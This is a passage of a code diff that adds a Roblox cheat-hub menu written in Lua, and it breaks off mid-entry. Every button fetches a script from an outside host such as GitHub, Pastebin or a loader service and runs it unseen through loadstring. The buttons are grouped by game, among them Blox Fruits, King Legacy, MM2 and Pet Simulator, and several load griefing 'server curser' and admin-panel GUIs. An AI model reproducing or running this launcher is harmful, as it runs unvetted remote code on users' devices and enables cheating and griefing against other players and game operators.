+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
+    end   
+})
+Tab:AddButton({
+  Name = "Sowrd Hub",
+  Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH/sh/main/Sword%20Hub'))()
+    end   
+})
+Tab:AddButton({
+	Name = "system broken hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()	
+  	end   
+})
+Tab:AddButton({
+  Name = "SuperLand Hub",
+  Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/izanthebestn1/Roblox_Scripts_And_Hubs/main/SuperLand_Hub.lua'))()
+    end   
+})
+Tab:AddButton({
+  Name = "Ski Hub",
+  Callback = function()
+        loadstring(game:HttpGet(("https://pastebin.com/raw/mT10xnt7"), true))()
+    end   
+})
+Tab:AddButton({
+  Name = "Equinox Hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Equinox-10887"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Sniff Hub",
+  Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/2dgeneralspam1/Sniff-Hub/main/Sniff%20Hub'))()
+    end   
+})
+Tab:AddButton({
+  Name = "Sky hub",
+  Callback = function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/SKOIXLL/RIVERHUB-SKYHUB/main/WL.lua'),true))()
+    end   
+})
+Tab:AddButton({
+  Name = "LK Hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://lkhub.net/s/loader.lua"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Rizz Hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/pPMRh5YJ"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Fathom Hub",
+  Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/UmhaEvTT",true))()
+    end   
+})
+Tab:AddButton({
+  Name = "Era Hub",
+  Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/zRWQnNjS'))()
+    end   
+})
+Tab:AddButton({
+  Name = "LX Hub",
+  Callback = function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/Gogogamer61/LXHub-Main/main/LXHub%20Main%20Script'),true))()
+    end   
+})
+Tab:AddButton({
+  Name = "LegonX Hub",
+  Callback = function()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/Lmaz8vF7'),true))();
+    end   
+})
+Tab:AddButton({
+  Name = "Dion Hub",
+  Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/GithubUset/Dion-Hub-VI/main/Dion%20Hub%20Be%20like.lua'))()
+    end   
+})
+Tab:AddButton({
+  Name = "ZEPHYR X",
+  Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ECLIPSEXHUB/ECLIPSE-X/main/ECLIPSE%20X.txt", true))()
+    end   
+})
+Tab:AddButton({
+  Name = "Coco Hub",
+  Callback = function()
+      loadstring(game:HttpGet(('https://gitlab.com/cococc/cocohub/-/raw/master/CocoLoader'),true))()	
+    end   
+})
+Tab:AddButton({
+  Name = "Simple Hub",
+  Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Simple-Scripts/main/Simple%20V3"))()
+    end   
+})
+Tab:AddButton({
+  Name = "Space Hub",
+  Callback = function()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Lucasfin000/Orbit-UI-Library/main/Library", true))()
+    end   
+})
+local Section = Tab:AddSection({
+        Name = "Guis"
+})
+Tab:AddButton({
+	Name = "Ro-Xploit V4",
+	Callback = function()
+      	loadstring(game:GetObjects("rbxassetid://175137115")[1].Source)()
+  	end   
+})
+Tab:AddButton({
+	Name = "Ro-Xploit V5",
+	Callback = function()
+      loadstring(game:GetObjects("rbxassetid://288646117")[1].Source)()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Ro-Xploit V6",
+	Callback = function()
+    loadstring(game:GetObjects("rbxassetid://364364477")[1].Source)()
+  	end   
+})
+Tab:AddButton({
+	Name = "T0PK3K 0.8",
+	Callback = function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20T0PK3K%200.8", true))() 	
+  	end   
+})
+Tab:AddButton({
+	Name = "T0PK3K 2.0",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20T0PK3K%20V2", true))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "T0PK3K 3.0",
+	Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20T0PK3K%20V3", true))()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "T0PK3K 4.0",
+	Callback = function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20T0PK3K%20V4", true))() 	
+  	end   
+})
+Tab:AddButton({
+	Name = "YourMom Gui",
+	Callback = function()
+    loadstring(game:GetObjects('rbxassetid://289110135')[1].Source)()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "Kappa GUI",
+	Callback = function()
+     loadstring(game:GetObjects("rbxassetid://277963953")[1].Source)() 	
+  	end   
+})
+Tab:AddButton({
+	Name = "Phantom X",
+	Callback = function()
+      	loadstring(game:GetObjects("rbxassetid://296648575")[1].Source)()
+  	end   
+})
+
+
+
+Tab:AddButton({
+        Name = "Scythe",
+        Callback = function()
+              loadstring(game:GetObjects("rbxassetid://112829174")[1].Source)()
+          end   
+      })
+Tab:AddButton({
+        Name = "legacy",
+        Callback = function()
+            loadstring(game:GetObjects("rbxassetid://1683559539")[1].Source)()	
+          end   
+      })
+      Tab:AddButton({
+        Name = "Boss_HAX ",
+        Callback = function()
+           loadstring(game:HttpGet("https://pastebin.com/raw/wfqWb6Lr"))() 	
+          end  
+      })
+      Tab:AddButton({
+        Name = "Server Curser Gui",
+        Callback = function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/xN3i89wY"))()	
+          end   
+      })
+  Tab:AddButton({
+        Name = "Lord Server Curser Gui by 16anz",
+        Callback = function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/x29MNaHd"))()	
+          end   
+      })
+      Tab:AddButton({
+        Name = "Server Cruser Gui by Team_Null & Stupid Diego",
+        Callback = function()
+             loadstring(game:HttpGet("https://pastebin.com/raw/g2Ccpr4N"))() 	
+          end   
+      })
+      Tab:AddButton({
+        Name = "tr0ll Gui by LordMuhamad & debby",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/601SkA66"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "Ep1c Gui Reborn by mmfv7 & k00pkidd",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/igxNevKu"))()
+          end   
+      })
+      local Section = Tab:AddSection({
+              Name = " c00lkidd Guis"
+      })
+      Tab:AddButton({
+        Name = "c00lgui Revival by jointeamCK for team c00lkidd 2",
+        Callback = function()
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/theawesomari0/c00lgui-revival-public/main/c00lgui%20revival", true))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "c00lgui Revival v2",
+        Callback = function()
+            loadstring(game:HttpGet(("https://raw.githubusercontent.com/theawesomari0/c00lgui/main/c00lgui"), true))()	
+          end   
+      })
+      Tab:AddButton({
+        Name = "c00lgui Reborn Rc7 by v3rx",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()	
+          end   
+      })
+      Tab:AddButton({
+        Name = "c00lgui Reborn v0.5 by 007n7",
+        Callback = function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/XQbGdCgW"))()	
+          end   
+      })
+      Tab:AddButton({
+        Name = "c00lgui2 Remake",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/ckid", true))()	
+          end   
+      })
+      Tab:AddButton({
+        Name = "c00lgui2 Admin Panel Reborn v0.6 by 0O7n7",
+        Callback = function()
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/apanel", true))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "c00lgui Reawakened by JUK",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/TheOfficialPrivate/c00lkiddgui/main/C00lgui_REAWAKENED-1.txt"))()	
+          end   
+      })
+
+      Tab:AddButton({
+        Name = "Mini c00lgui by c00lkidd",
+        Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/UPZCQ31W"))()    	
+          end   
+      })
+      Tab:AddButton({
+        Name = "c00lGui rebron by LordMuhamad",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/PpdkLWnE"))()
+          end   
+      })
+
+      Tab:AddButton({
+        Name = "Mini c00lgui by c00lbykidzz",
+        Callback = function()
+
+          end   
+      })
+      local Section = Tab:AddSection({
+              Name = " 1x1x1x1 Guis"
+      })
+      Tab:AddButton({
+        Name = "1x1x1x1 Gui by Hidden",
+        Callback = function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/CYye6uA4"))()	
+          end   
+      })
+      Tab:AddButton({
+        Name = "1x1x1x1 Gui by Alan Chiel",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/JipYNCht"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "1x3x5x6 v2 by Team 1x3x5x6",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/172cdwzY"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "1x1x1x1 Gui by Krnkidssus",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/4V5qA9Wf"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "1x1x1x1 Gui Remake by 3x9x9x8",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/zpjuEefG"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "1x1x1x1 Gui Remake 2 by 1x1x1x1 & c00lkidd",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/NVKQT0d7"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "1x1x1x1 Gui v1 by Servano",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/6QjADBx8"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "1x1x1x1 Was Here Gui by tr0llskidd",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/3p1A81p1"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "1x1x1x1 Gui by c00lbykidzz",
+        Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/abbkgxut"))()
+          end   
+      })
+
+ local Tab = Window:MakeTab({
+	Name = "Blox fruit",
+	Icon = "rbxassetid://6034227061",
+	PremiumOnly = false
+}) 
+      Tab:AddButton({
+        Name = "Speed x Hub",
+        Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmadsgamer2/Dragon-Hub/main/Script-Execute.lua"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "REDZ Hub",
+        Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "SpectrumX Hub",
+        Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/SpectrumX.lua"))()
+          end   
+      })
+      Tab:AddButton({
+        Name = "Neva hub",
+        Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2"))() 
+          end   
+      })
+      Tab:AddButton({
+        Name = "Mango Hub",
+        Callback = function()
+loadstring(game:HttpGet('https://gitlab.com/L1ZOT/mango-hub/-/raw/main/Mango-Bloxf-Fruits-Beta'))() 
+          end   
+      })
+      Tab:AddButton({
+        Name = "Tawan Hub",
+        Callback = function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kill55547/TAWAN_HUB/main/hub.lua.txt'))() 
+          end   
+      })
+Tab:AddButton({
+	Name = "Hoho Hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Zen hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenhubtop/zen_hub_pr/main/zennewwwwui.lua", true))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Tuper Hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/TUPERX/TUPERX/Main/MenuBF/README.md'))() 
+  	end   
+})
+Tab:AddButton({
+	Name = "East Hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/Brineeee/EastHub/main/lua'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Chiba Hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/KindIhave/ChibaHuB/main/Chiba-BF.txt'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "BlazeX Hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/WindowsXp12/BlxzeRBLX/main/BLxzeHub.lua'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Putaya Hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/Putaya/HITBOXKAK/main/PutayaFree'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Hung Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/hungquan99/HungHub/main/Loading"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "String Hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/StringV2/StringHub/main/BF.lua", true))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "HIRU Hub",
+	Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/NGUYENVUDUY1/Update_new/main/HiruHub.lua"))()    	
+  	end   
+})
+Tab:AddButton({
+	Name = "Neon Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/NIGHTHUBONTOP/Main/main/LoaderScript.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Radon Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-Neptune/RadonHub/main/Script.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Sukuna Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/pokelokbr/Dr.peste/main/sukunav9"))()
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Vector Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/AAwful/VectorHub/main/uh.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Relz Hub",
+	Callback = function()
+      	-- Theme = ["Red", "Blue", "DarkBlue", "LightGreen", " Green", "Cyan", "Purple", " Zinc"] --Default: Zinc;
+-- Ui = ["Mobile", "Pc"] --Default: Pc;
+_G.Theme = ""
+_G.Ui = "Mobile"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/farghii/relzhub/main/execute.hack", true))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Raito Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/RaitoHub/main/Script"))()
+  	end   
+})
+
+Tab:AddButton({
+	Name = "Cokka Hub",
+	Callback = function()
+      loadstring(game:HttpGet"https://codeberg.org/CokkaHub/Loadstring/raw/branch/main/CokkaHub.lua")()	
+  	end   
+})
+Tab:AddButton({
+	Name = "HIRIMI X",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/Hirimii/X-Version/main/LoaderX.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Dragon Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmadsgamer2/Dragon-Hub/main/Script-Execute.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "FAIFAO Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/PNguyen0199/Script/main/Fai-Fao-Ver2.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Master Hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/onepicesenpai/onepicesenpai/main/onichanokaka'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Zee Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://link.trwxz.com/LS-Zee-Hub-VIP"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Wolf Hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://link.trwxz.com/LS-Wolf-Hub'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Jerry Hub (key = JKL)",
+	Callback = function()
+      	_G.Key = "JKL"
+_G.Team = "Pirate" --Pirate or Marine
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fef0694b5887834a71a7caef49d34871.lua"))()
+  	end  
+ })
+Tab:AddButton({
+	Name = "THUNDER Hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest', true))()
+  	end   
+})
+Tab:AddButton({
+	Name = "MTRIET Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/Minhtriettt/Free-Script/main/MTriet-Hub.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "MAKORI Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/MkoriCraft/NewScript/main/Comback!.lua",true))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Heater Hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/HeatHuh/HeaterHub/main/HeaterLoader"))()
+  	end   
+})
+local Tab = Window:MakeTab({
+	Name = "King legacy",
+	Icon = "rbxassetid://6034227061",
+	PremiumOnly = false
+}) 
+Tab:AddButton({
+	Name = "zee hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://zuwz.me/Ls-Zee-Hub-KL'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "hyper hub",
+	Callback = function()
+      	repeat wait() until game:IsLoaded()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DookDekDEE/Hyper/main/script.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "LH hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Upd6/main/King"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "BT hub",
+	Callback = function()
+      	loadstring(game:HttpGetAsync("https://lua-library.btteam.net/script-auth.txt"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Zen hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenhubtop/zen_hub_pr/main/zennewwwwui.lua", true))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Hulku hub",
+	Callback = function()
+      loadstring(game:HttpGet"https://raw.githubusercontent.com/HULKUexe/mobileX/main/FreeScript.lua")()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Adel hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/AdelOnTheTop/Adel-Hub/main/Main.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Winnable hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/Winnablez/Winnable/main/Loader")){}
+  	end   
+})
+Tab:AddButton({
+	Name = "Hoho hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
+
+  	end   
+})
+Tab:AddButton({
+	Name = "Speed x hub",
+	Callback = function()
+      	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ahmadsgamer2/Speed-Hub-X/main/SpeedHubX"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Mukuro hub",
+	Callback = function()
+      	loadstring(game:HttpGet"https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader")()
+  	end   
+})
+Tab:AddButton({
+	Name = "Xenon hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/XenonKL"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Dolce hub (key = Hi)",
+	Callback = function()
+      	getgenv().Key = "Hi" 
+loadstring(game:HttpGet("https://dolcehub.xyz/getscript"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Best hub",
+	Callback = function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/CFrame3310/CFrameHub/main/KingLegacy.lua"))() 	
+  	end   
+})
+Tab:AddButton({
+	Name = "Ripper hub",
+	Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hajibeza/RIPPER-HUB/main/King%20Leagacy"))()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "Strike hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/StormSKz12/StirkeHub1/main/Gameincluded"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "River hub",
+	Callback = function()
+      pcall(function()
+loadstring(game:HttpGet("http://riverhub.xyz/" .. tostring(game.PlaceId) .. ".lua"))()
+end)	
+  	end   
+})
+
+
+
+
+local Tab = Window:MakeTab({
+	Name = "MM2",
+	Icon = "rbxassetid://6034227061",
+	PremiumOnly = false
+}) 
+Tab:AddButton({
+	Name = "Admin panel",
+	Callback = function()
+      	loadstring(game:HttpGet('https://pastebin.com/raw/e89Mn4Ec'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Dreadz hub",
+	Callback = function()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/DreadzHub2/DreadzHub-Scripts-FR/main/Loader"))()     	
+  	end   
+})
+Tab:AddButton({
+	Name = "Vynixu gui",
+	Callback = function()
+    loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "Toral Hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0mm2", true))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Lunar hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/vwSaraa/LunarHub/main/mm2"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Xenny-Ware Hub",
+	Callback = function()
+      	repeat wait() until game.Players.LocalPlayer.Character
+url = "https://raw.githubusercontent.com/xennyy/Xenny-Ware/main/loader.lua"
+loadstring(game:HttpGet(url))()
+  	end   
+})
+Tab:AddButton({
+	Name = "NukeVsCity hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/TheALLHACKLoader/main/NukeLoader"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "unfair hub",
+	Callback = function()
+      loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "ski hub",
+	Callback = function()
+    loadstring(game:HttpGet(("https://pastebin.com/raw/mT10xnt7"), true))()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "Owl hub",
+	Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();  	
+  	end   
+})
+local Tab = Window:MakeTab({
+	Name = "Anime fighter simulator",
+	Icon = "rbxassetid://6034227061",
+	PremiumOnly = false
+}) 
+Tab:AddButton({
+	Name = "Platinum hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/Loader/main/PlatiniumLoader"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Sky hub",
+	Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/SKOIXLL/RIVERHUB-SKYHUB/main/WL.lua'))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Zero hub",
+	Callback = function()
+     loadstring(game:HttpGet("https://zer0hub.com/script?code="..game.PlaceId))() 	
+  	end   
+})
+Tab:AddButton({
+	Name = "Yuto hub",
+	Callback = function()
+      repeat wait() until game:IsLoaded()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Binintrozza/yutv2e/main/afss"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "SSJ3 hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/Gohan9k/ANFSnew/main/GOHANSSJ3"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Hoho hub",
+	Callback = function()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Phantom",
+	Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/destylol/masterhubv311/itachi/Main.lua"))()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "Zen hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Loader", true))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "KJ hub",
+	Callback = function()
+      loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/KiJinGaming/FreeScript/main/KJHub.lua"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Hyper hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/DookDekDEE/AFS/main/script.lua"))()
+  	end   
+})
+
+local Tab = Window:MakeTab({
+	Name = "pet simulator 99",
+	Icon = "rbxassetid://6034227061",
+	PremiumOnly = false
+}) 
+Tab:AddButton({
+	Name = "Huge Games hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Banana hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/diepedyt/bui/main/temporynewkeysystem.lua"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Lenut yub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/lenutjr/lenut/main/scripts"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Nicus hub",
+	Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/PetSimulator99.lua"))()	
+  	end   
+})
+Tab:AddButton({
+	Name = "Zap hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "IDIO hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/Somerandomidiot/Lua/main/PS99_Protected.txt"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "REDZ hub",
+	Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()  	
+  	end   
+})
+Tab:AddButton({
+	Name = "HG hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Wazure hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4c8e3ee28e64ee380d7251b64c0801fb.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Sky hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://raw.githubusercontent.com/SKOIXLL/RIVERHUB-SKYHUB/main/WL.lua'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "BT hub",
+	Callback = function()
+      	loadstring(game:HttpGet('https://btteam.net/scripts-auth/', true))()
+  	end   
+})
+
+local Tab = Window:MakeTab({
+	Name = "pet simulator x",
+	Icon = "rbxassetid://6034227061",
+	PremiumOnly = false
+}) 
+Tab:AddButton({
+	Name = "WD hub",
+	Callback = function()
+      	getgenv().boothsnipe = false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Mainstring.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Milk hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fc715fb43902af268c335a5c7269be5e.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "BT hub",
+	Callback = function()
+      	loadstring(game:HttpGetAsync("https://blacktrap.org/checkpoint/Auth.txt"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Rafa hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafacasari/roblox-scripts/main/psx.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Cloud hub",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/BadScripters/CloudHub/main/hub"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "Extreme hub",
+	Callback = function()
+      	_G.ExtremeHUBLoaded = true
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ExtremeAntonis/KeySystemUI/main/All-Scripts-Obfuscated.lua'))()
+  	end   
+})
+Tab:AddButton({
+	Name = "JMES hub",
+	Callback = function()
+      	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jmesfo0/RobloxScripts/main/psx-jmes.lua"))()
+  	end   
+})
+Tab:AddButton({
+	Name = "EVO hub",
+	Callback = function()
